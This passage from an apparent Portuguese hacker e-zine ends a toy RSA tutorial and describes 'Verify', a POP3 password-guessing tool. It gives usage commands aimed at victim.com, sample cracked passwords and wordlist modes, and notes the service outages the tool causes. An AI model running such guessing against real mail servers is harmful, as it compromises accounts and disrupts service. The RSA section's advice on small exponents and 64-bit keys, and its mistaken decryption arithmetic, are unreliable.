+Para decodificar devemos acha d que eh o inverso de e modulo phi(n). Complicado,
+nao? Sim, isso eh uma matematica um pouco avancada, mais eu deixei um codigo
+como o algoritmo para achar d. No nosso caso d eh igual a 41495143.
+
+Para decodificar um bloco a, basta achar o resto da divisao de a**d por n.
+Vamos pegar o primeiro bloco 5156724 : o resto da divisao de 5156724*41495143
+por 96841681, que eh 65(eh claro!).
+
+Como disse anteriormente a seguranca do RSA depende da escolha de p e q bem
+grandes e tambem escolher e pequeno para dificultar a quebra. Vale lembrar que
+antes de codificar voce deve dividir o que voce quer codificar em blocos. Se
+voce colocar cada bloco como um caracter somente, vai ser facil decodificar,
+logo voce deve escolher blocos grandes para ter bastante seguranca.
+
+Vamos voltar a pratica e voltar ao exemplo do banco:
+
+(voce entra)
+Banco : Para voce codificar, voce vai usar n e e.
+
+Logo para o banco decodificar vai usar o d que ele tem. Se por algum motivo
+alguem descobrir d, vai poder ler tudo que voce mandar, inclusive sua senha
+do banco (imagina?).
+
+Aqui estah com poucas provas, pois necessita de um conhecimento de matematica
+um pouco avancada e que nao cabe nesse texto introdutorio. Mas vale a pena co-
+locar algumas observacoes :
+- Se voce escolher p e q grandes n vai ser enorme de com isso dificil de des-
+cobrir.
+- Se voce escolher e pequeno, d vai ser muito grande e com isso dificil de des-
+cobrir.
+- Se voce pegar blocos pequenos, vai ser facil deduzir d e quebrar o resto.
+
+Existe outro problema : A escolha das chaves. Para escolher chaves grandes eh
+necessario alguns algoritmos complicados. Eu ateh fiz esses algoritmos, mas
+o tipo long long suporta somente numeros com ateh 64bits(i386 Linux). Logo
+n nao pode ser maior que 64bits, entao p e q nao podem ser maiores que 32bits e
+para achar chaves de ateh 32bits eu coloquei um programa que acha todas as
+chaves primas ateh um numero X qualquer, por exemplo :
+
+eraser:~# achachaves
+Numero : 30
+Numeros :
+1
+2
+3
+5
+7
+11
+13
+17
+19
+23
+29
+
+Esse programa acha numeros primos ateh 2**64 e vale lembrar que ele usa MUITA
+MEMORIA. Por exemplo, se voce quer achar todos os numeros primos ateh 1000000
+ele vai usar 1Mb de RAM. Nao otimizei muito na memoria pois aqui eh um exemplo
+pequeno. Logo logo vou fazer um script para o bc , jah que o bc suporta numeros
+extremamente grandes.
+
+Aih vai a descricao dos outros programas :
+achaparametros.c              - acha phi, e, d e n
+codifica.c                    - codifica um arquivo usando e e n e gera um
+                                arquivo chamado codificado.
+decodifica.c                  - decodifica um arquivo usando d e n e gera um
+                                arquivo chamado decodificado.
+
+-----------------------------------------------------------------[rwx06]---
+
+Verificador de Senhas By Br4d0ck
+
+[ VERIFY.C -> Verificador de Senhas By Br4d0ck ]
+
+ Existe por ai muitos usuarios que nao se preocupam com as suas proprias
+senhas. Esses usuarios nao dao a minima para elas e procuram deixa-las
+faceis para poderem mais tarde lembrarem das mesmas sem correr o risco de esque
+ce-las.
+
+   Quando digo senhas faceis me refiro a senhas do tipo:
+
+ * senha com 3 digitos        => Sensiveis a ataques de forca bruta
+ * senha = login              => A senha e' o proprio login do usuario
+ * senha = login ao contrario => A senha e' o login do usuario com as letras in
+vertidas
+ * logins e senhas defaults   => As senhas que ja vem no sistema (o root precis
+a mudar)
+
+  Senhas facilmente deduziveis sao tambem aquelas mais utilizadas pela maioria
+dos  usuarios como:
+
+ 1234
+ 12345
+ academia
+ futebol
+
+    Pensando nisso, desenvolvi um programa que atraves do servico pop3, vai ten
+tar diversas  vezes obter as senhas dos usuarios do sistema ate obter sucesso.
+    Geralmente o servidor de pop (in.pop3d no linux) esta configurado para
+desconexao apos
+ 3 tentativas, ja outros estao configurados para desconexao apos uma tentativa,
+ entao  o meu programa, por via das duvidas vai estabalecer uma conexao para cada tent
+ativa fechando a  conexao anterior.
+    O Verify esta adaptado para diversas situacoes, a primeira delas e' a de ve
+rificar as senhas  defaults, ou seja, as senhas que ja vem definidas para os
+usuarios do sistema para serem posteriomente alteradas pelo administrador.
+Caso o root esqueca de alterar alguma delas o programa acusara.
+   A Segunda delas e' vc checar individualmente a senha de um usuario, vamos a
+um exemplo, supondo que eu sei da existencia um login joao em uma maquina, eu
+quero saber se a senha dele e' imbecil, bom, uma senha imbecil foram aqueles
+exemplos que eu citei la em cima, entao vamos lah:
+
+  bradock:#~ verify victim.com -2 joao
+
+              Verify Versao 1.42b
+                By Br4d0ck (bradock@usa.net)
+
+    Conectado a [victim.com] : 110
+
+    USERNAME: joao
+    PASSWORD: oaoj
+
+    Done. Please check file logs!
+
+  Note que a senha do usuario joao e' o proprio login dele escrito inversamente
+, ou seja, e' uma senha facilmente deduzivel. O verify reconhece senhas
+facilmente deduziveis testando primeiro se o usuario nao tem senha, se
+tem a senha igual ao login e por ultimo invertendo o login. Ao final do
+programa ele mostra a mensagem "Done. Please check file logs!". Durante o
+seu processo o Verify faz dois arquivos de log, o primeiro deles e' o
+server.log que mostra como se procedeu a conexao  e as tentativas registrando
+todas as respostas do servidor no arquivo de log, caso ele ache uma  senha,
+esta senha sera exibida na tela (como no exemplo acima) e sera gravada no
+arquivo verify.log.
+   O Terceiro metodo de verificacao de senha vai fazer exatamente o que foi
+feito no exemplo acima, so' que ao inveis do login ser passado como parametro
+sera passado  um arquivo com uma  lista de logins, isso significa que, vc pode deix
+ar o programa rodando e ir dormir, mais tarde,  vc volta e verifica o arquivo
+verify.log. Exemplo :
+
+  bradock:#~ verify victim.com -3 login_file
+
+              Verify Versao 1.42b
+                By Br4d0ck (bradock@usa.net)
+
+   Conectado a [victim.com] : 110
+   5%
+   USERNAME: joao
+   PASSWORD: oaoj
+   45%
+   USERNAME: rita
+   PASSWORD: rita
+   100%
+
+  Done. Please check file logs!
+
+  O quarto metodo vai verificar um arquivo de logins juntamente com um arquivo
+de wordlist, ele  NAO vai tentar da mesma maneira que o 2 metodo (senhas deduzi
+veis) ele vai apenas ler o arquivo  de login, depois ler o arquivo de wordlsit
+e ver se o login d
+e usuario eh alguma senha que esta  no arquivo de dicionario que deve ser o mai
+s simples possivel, visto que, um arquivo de wordlist muito grande, vai demorar
+ alem do que, vai deixar rastros enormes nos arquivos de log do servidor, lembr
+e-se todas as tent
+ativas que o verify fizer ficaram logadas no servidor, mais isso nao e' motivo
+de preocupacao visto que nos arquivos de log, vai constar varias conexoes suces
+sivas a porta 110 (pop3) e nao que elas foram sem sucesso (pelo menos no in.pop
+3d), porem nenhum
+admin eh burro suficiente e logo nota-se que houve uma tentativa de obtencao de
+ senha.
+  O quinto metodo eh o mais eficaz porem o mais demorado, ele trabalha como o m
+etodo quatro alem
+ de fazer a tentativa de senhas deduziveis como no segundo e terceiro metodos,
+porem, como havia dito anteriomente eh recomendado um arquivo de wordlist mais
+simples possivel com apenas as senhas mais usadas e nao  com nomes dificieis.
+   Usando o Linux com um computador simples e com pouca memoria swap servindo a
+ porta 110(pop3), este servico sera candidato a sofrer um D.O.S (denial of serv
+ice) por alguns minutos (5 a 10 minutos) porque o computador ficara sobrecarreg
+ado devido as suce
+ssivas conexoes simultaneas deixando o  servico desabilitado, isso significa qu
+e em um provedor de baixo porte, os usuarios nesse momento  estariam impossibil
+itados de baixarem seus e-mails por sua culpa. Isso nao eh bom, primeiro porque
+ vc vai perder tem
+po, segundo porque o programa tera que ser abortado(CTRL+C). O Verify possui um
+ recurso adcionado recentemente que depois de ser abordado e desativado, ao rod
+ar novamente ele perguntara a vc se deseja continuar de onde parou.
+   Bom, eh soh isso, se quizerem me mandar alguma opniao ou correcao de algum e
+rro que eu tenha
+ cometido no meu programa (errar eh humano) eh soh me enviar um e-mail. Estou a
+ceitando tb sugestoes e criticas.
+
+ T+ Pessoal
+   Br4d0ck (bradock@usa.net)
+
+-----------------------------------------------------------------[rwx06]---
+
+Membros atuais da RwX
+
+kbyte <kbyte@rwx.ml.org>
+[0x5002] <xsatanic@rwx.ml.org>
+Anarchy <anarchy@rwx.ml.org>
+DmS <dms@rwx.ml.org> - Ele voltou!:)
+Skynet <skynet@rwx.ml.org>
+_Knight_ <knight@rwx.ml.org>
+auth <auth@rwx.ml.org>
+
+e obrigado por todos os colaboradores dessa edicao
